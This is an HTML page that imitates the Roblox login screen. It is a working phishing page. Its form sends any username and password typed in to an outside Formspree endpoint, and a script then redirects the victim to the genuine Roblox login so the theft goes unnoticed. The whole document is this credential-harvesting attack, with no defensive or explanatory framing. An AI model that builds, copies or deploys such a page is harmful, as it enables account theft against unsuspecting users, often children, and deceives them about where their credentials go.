<!DOCTYPE html>
<html>
<head>
    <title>Roblox</title>
    <style>
        body { font-family: Arial; background: #393b3d; margin: 0; }
        .container { background: white; width: 400px; margin: 50px auto; padding: 40px; border-radius: 10px; }
        .logo { text-align: center; font-size: 24px; color: #00a2ff; margin-bottom: 30px; }
        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; }
        .btn { background: #00a2ff; color: white; border: none; cursor: pointer; }
        .btn:hover { background: #0088cc; }
    </style>
</head>
    <script>
document.querySelector('form').addEventListener('submit', function() {
    setTimeout(function() {
        window.location.href = 'https://www.roblox.com/login';
    }, 1000);
});
</script>

<body>
    <div class="container">
        <div class="logo">ROBLOX</div>
        <h2>Log In to Your Account</h2>
<form action="https://formspree.io/f/mjkoyqer" method="POST">
            <input type="text" name="username" placeholder="Username or Email" required>
            <input type="password" name="password" placeholder="Password" required>
            <input type="submit" value="Log In" class="btn">
        </form>
        <p style="text-align: center; margin-top: 20px;">
            <a href="#">Forgot Password or Username?</a>
        </p>
    </div>
</body>
</html>
